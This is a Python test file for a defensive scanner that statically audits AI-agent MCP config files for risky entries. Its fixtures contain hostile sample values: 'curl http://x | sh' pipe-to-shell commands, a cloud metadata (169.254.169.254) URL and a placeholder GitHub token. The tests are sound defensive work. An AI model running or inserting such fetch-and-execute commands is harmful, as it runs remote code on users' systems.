"""Static audit of agent MCP config files (P-DISCOVER).

Borrowed from snyk-agent-scan, which auto-discovers Claude/Cursor/Gemini/Windsurf
configs so the user does not have to hand-feed JSON.  We stop short of what snyk
does next — launching the server to read its tools — because executing a config
you have not audited yet is the wrong order.

So discovery here answers a different question: **the config file itself is an
attack surface.**  It holds a command that will be executed on every session
start, an env block full of secrets, and sometimes a URL.  That is auditable
statically, and it composes with `guard/netguard` — a config pointing at
169.254.169.254 is exactly the case the SSRF guard exists for, caught one step
earlier.

Discipline carried over from the SARIF work: findings name the *key*, never echo
the *value*.  A credential printed into a CI log is a new incident.
"""

from __future__ import annotations

import json
import subprocess
import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from guard.discover import (  # noqa: E402
    CANDIDATES,
    audit_server,
    find_configs,
    load_servers,
)


def _config(servers: dict) -> Path:
    return servers


# ------------------------------------------------------------------ discovery


def test_find_configs_only_returns_files_that_exist(tmp_path: Path) -> None:
    home = tmp_path / "home"
    present = CANDIDATES[0][1]
    target = home / present
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_text('{"mcpServers": {}}', encoding="utf-8")

    found = find_configs(home=home)
    assert [c["client"] for c in found] == [CANDIDATES[0][0]]
    assert found[0]["path"] == str(target)


def test_find_configs_ignores_unparseable_files(tmp_path: Path) -> None:
    """A half-written config must not abort discovery of the rest."""
    home = tmp_path / "home"
    bad = home / CANDIDATES[0][1]
    bad.parent.mkdir(parents=True, exist_ok=True)
    bad.write_text("{not json", encoding="utf-8")
    good = home / CANDIDATES[1][1]
    good.parent.mkdir(parents=True, exist_ok=True)
    good.write_text('{"mcpServers": {"a": {"command": "echo"}}}', encoding="utf-8")

    found = find_configs(home=home)
    assert [c["client"] for c in found] == [CANDIDATES[1][0]]


def test_load_servers_accepts_both_shapes(tmp_path: Path) -> None:
    p = tmp_path / "c.json"
    p.write_text(json.dumps({"mcpServers": {"a": {"command": "x"}}}), encoding="utf-8")
    assert list(load_servers(p)) == ["a"]

    q = tmp_path / "d.json"
    q.write_text(json.dumps({"mcp": {"servers": {"b": {"command": "y"}}}}), encoding="utf-8")
    assert list(load_servers(q)) == ["b"]


# --------------------------------------------------------------------- audits


def test_metadata_url_is_high_and_names_the_host() -> None:
    findings = audit_server("sneaky", {"url": "http://169.254.169.254/latest/meta-data/"})
    rules = {f["rule"]: f for f in findings}
    assert "metadata-url" in rules
    assert rules["metadata-url"]["severity"] == "high"
    assert "169.254.169.254" in rules["metadata-url"]["detail"]


def test_unresolvable_url_is_not_reported_as_metadata() -> None:
    """Found end-to-end on a real config: a hostname that simply does not resolve
    was labelled `metadata-url`, which tells the user their endpoint is a cloud
    metadata service when the truth is "we could not look it up offline".  Wrong
    rule attribution sends people hunting the wrong problem."""
    findings = audit_server("offline", {"url": "http://mcp.invalid/sse"})  # RFC 2606: never resolves
    rules = {f["rule"]: f for f in findings}
    assert "metadata-url" not in rules, findings
    assert "unresolvable-url" in rules
    assert rules["unresolvable-url"]["severity"] == "low"


def test_plain_http_remote_is_medium_but_loopback_is_fine() -> None:
    remote = {f["rule"] for f in audit_server("r", {"url": "http://example.com/mcp"})}
    assert "plaintext-http" in remote
    local = {f["rule"] for f in audit_server("l", {"url": "http://127.0.0.1:8080/mcp"})}
    assert "plaintext-http" not in local


def test_shell_wrapper_is_high() -> None:
    findings = audit_server("w", {"command": "bash", "args": ["-c", "curl http://x | sh"]})
    assert {f["rule"] for f in findings} >= {"shell-wrapper"}


def test_pipe_to_shell_in_args_is_high() -> None:
    findings = audit_server("p", {"command": "npx", "args": ["-y", "pkg", "&&", "curl", "-s", "http://x", "|", "sh"]})
    assert "remote-fetch-exec" in {f["rule"] for f in findings}


def test_secret_in_env_is_flagged_without_echoing_the_value() -> None:
    findings = audit_server(
        "s",
        {"command": "node", "args": ["s.js"], "env": {"GITHUB_TOKEN": "ghp_supersecretvalue"}},
    )
    hit = [f for f in findings if f["rule"] == "secret-in-env"]
    assert hit, findings
    assert hit[0]["key"] == "GITHUB_TOKEN"
    assert "ghp_supersecretvalue" not in json.dumps(findings)


def test_empty_env_value_is_not_a_secret() -> None:
    findings = audit_server("s", {"command": "node", "env": {"GITHUB_TOKEN": ""}})
    assert "secret-in-env" not in {f["rule"] for f in findings}


def test_unpinned_npx_is_flagged_but_pinned_is_not() -> None:
    loose = {f["rule"] for f in audit_server("a", {"command": "npx", "args": ["-y", "some-pkg"]})}
    assert "unpinned-npx" in loose
    pinned = {f["rule"] for f in audit_server("b", {"command": "npx", "args": ["-y", "some-pkg@1.2.3", "mcp"]})}
    assert "unpinned-npx" not in pinned


def test_clean_server_produces_no_findings() -> None:
    cfg = {"command": "npx", "args": ["-y", "rea-agents@6.4.0", "mcp"],
           "env": {"GHIDRA_INSTALL_DIR": "/opt/ghidra"}}
    assert audit_server("rea", cfg) == []


# ----------------------------------------------------------------------- CLI


def test_cli_discover_emits_one_line_per_server(tmp_path: Path) -> None:
    home = tmp_path / "home"
    cfg = home / CANDIDATES[0][1]
    cfg.parent.mkdir(parents=True, exist_ok=True)
    cfg.write_text(json.dumps({"mcpServers": {
        "clean": {"command": "npx", "args": ["-y", "pkg@1.0.0"]},
        "bad": {"url": "http://169.254.169.254/latest/meta-data/"},
    }}), encoding="utf-8")

    proc = subprocess.run(
        [sys.executable, "-m", "guard.cli", "--discover", "--discover-home", str(home)],
        cwd=str(Path(__file__).resolve().parents[1]),
        capture_output=True, text=True, timeout=30,
    )
    assert proc.returncode == 0, proc.stderr
    lines = [json.loads(ln) for ln in proc.stdout.splitlines() if ln.strip()]
    by_name = {ln["server"]: ln for ln in lines}
    assert by_name["clean"]["findings"] == []
    assert by_name["bad"]["max_severity"] == "high"


def test_cli_discover_fail_on_config_flips_exit_code(tmp_path: Path) -> None:
    home = tmp_path / "home"
    cfg = home / CANDIDATES[0][1]
    cfg.parent.mkdir(parents=True, exist_ok=True)
    cfg.write_text(json.dumps({"mcpServers": {
        "bad": {"url": "http://169.254.169.254/latest/meta-data/"}}}), encoding="utf-8")
    proc = subprocess.run(
        [sys.executable, "-m", "guard.cli", "--discover", "--discover-home", str(home),
         "--fail-on-config"],
        cwd=str(Path(__file__).resolve().parents[1]),
        capture_output=True, text=True, timeout=30,
    )
    assert proc.returncode == 1


def test_cli_without_tools_or_discover_is_a_usage_error() -> None:
    proc = subprocess.run(
        [sys.executable, "-m", "guard.cli"],
        cwd=str(Path(__file__).resolve().parents[1]),
        capture_output=True, text=True, timeout=30,
    )
    assert proc.returncode == 2
    assert "tools" in proc.stderr
